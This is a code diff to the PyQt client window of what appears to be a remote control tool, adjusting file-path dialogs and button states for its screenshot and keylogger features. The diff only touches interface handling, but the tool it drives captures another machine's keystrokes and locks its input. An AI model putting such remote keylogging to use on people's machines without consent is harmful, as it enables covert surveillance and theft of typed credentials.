@@ -126,14 +126,10 @@ class ClientWindow:
         filepath = os.path.join(location, filename)
         self.stream_socket.save_screenshot(filepath)
     def browser_screen(self):
-        path = QFileDialog.getSaveFileName()[0]
+        path = QFileDialog.getExistingDirectory()
         if path != "":
-            items = path.split("/")
-            print(items)
-            filename = items[-1]
-            location = "/".join(items[:len(items)-1])
-            self.uic.text_location_screen.setText(location)
-            self.uic.text_filename_screen.setText(filename)
+            path = "\\".join(path.split("/"))
+            self.uic.text_location_screen.setText(path)
     
 
     #----- Code Area -----
@@ -163,6 +159,7 @@ class ClientWindow:
         self.uic.button_save_keylog.clicked.connect(self.save_keylog)
         self.uic.button_delete_keylog.clicked.connect(self.delete_keylog)
         self.uic.button_browser_keylog.clicked.connect(self.browser_keylog)
+        self.uic.text_filename_keylog.setText("keylog.txt")
         self.uic.button_unlock_input.hide()
         self.uic.button_stop_keylogger.setEnabled(False)
     def control_input(self):
@@ -180,7 +177,7 @@ class ClientWindow:
         self.socket.control_input(True)
         self.uic.button_lock_input.show()
         self.uic.button_unlock_input.hide()
-        self.uic.button_start_keylogger.setEnabled(False)
+        self.uic.button_start_keylogger.setEnabled(True)
         self.uic.button_stop_keylogger.setEnabled(False)
     def start_keylogger(self):
         self.socket.start_keyhook(self.uic.keylog)
@@ -203,15 +200,10 @@ class ClientWindow:
         fwrite = open(filepath,"w")
         fwrite.write(text)
     def browser_keylog(self):
-        path = QFileDialog.getSaveFileName()[0]
+        path = QFileDialog.getExistingDirectory()
         if path != "":
-            items = path.split("/")
-            filename = items[-1]
-            if '.' not in filename:
-                filename += ".txt"
-            location = "/".join(items[:len(items)-1])
-            self.uic.text_location_keylog.setText(location)
-            self.uic.text_filename_keylog.setText(filename)
+            path = "\\".join(path.split("/"))
+            self.uic.text_location_keylog.setText(path)
 
 
     #----- Code Area -----
